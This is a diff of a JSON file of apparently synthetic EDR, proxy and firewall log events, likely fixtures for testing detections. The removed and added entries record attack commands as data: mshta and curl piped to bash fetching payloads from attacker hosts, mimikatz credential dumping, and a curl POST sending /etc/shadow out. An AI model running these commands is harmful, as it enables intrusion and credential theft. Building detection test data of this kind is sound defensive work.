@@ -1,63 +1,32 @@
 [
   {
-    "timestamp": "2025-05-20T14:10:10",
+    "timestamp": "2025-05-18T09:35:17Z",
     "source_type": "edr",
     "vendor": "velociraptor",
-    "process_name": "mshta.exe",
-    "command_line": "mshta http://evil.com/payload.hta",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "dst_ip": "8.8.8.8"
+    "process_name": "bash",
+    "command_line": "curl http://attacker.site/payload.sh | bash",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "dst_ip": "123.123.123.123"
   },
   {
-    "timestamp": "2025-05-20T14:10:15",
+    "timestamp": "2025-05-18T09:35:19Z",
     "source_type": "edr",
     "vendor": "velociraptor",
-    "process_name": "powershell.exe",
-    "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "dst_ip": "8.8.8.8"
+    "process_name": "curl",
+    "command_line": "curl http://attacker.site/payload.sh",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "dst_ip": "123.123.123.123"
   },
   {
-    "timestamp": "2025-05-20T14:10:25",
+    "timestamp": "2025-05-18T09:35:22Z",
     "source_type": "edr",
     "vendor": "velociraptor",
-    "process_name": "rundll32.exe",
-    "command_line": "rundll32 my.dll,Inject",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "dst_ip": "8.8.8.8"
-  },
-  {
-    "timestamp": "2025-05-20T14:10:40",
-    "source_type": "edr",
-    "vendor": "velociraptor",
-    "process_name": "mimikatz.exe",
-    "command_line": "sekurlsa::logonpasswords",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "dst_ip": "8.8.8.8"
-  },
-  {
-    "timestamp": "2025-05-20T14:11:00",
-    "source_type": "proxy",
-    "vendor": "squid",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "url": "http://attacker.site/exfil/data.zip",
-    "status": "TCP_MISS/200",
-    "dst_ip": "8.8.8.8"
-  },
-  {
-    "timestamp": "2025-05-20T14:10:50",
-    "source_type": "fw",
-    "vendor": "pfsense",
-    "username": "user01",
-    "src_ip": "192.168.100.10",
-    "dst_ip": "8.8.8.8",
-    "dst_port": 443,
-    "protocol": "tcp",
-    "action": "allow"
+    "process_name": "curl",
+    "command_line": "curl -X POST http://attacker.site/exfil --data '@/etc/shadow'",
+    "username": "analyst1",
+    "src_ip": "192.168.1.55",
+    "dst_ip": "123.123.123.123"
   }
 ]
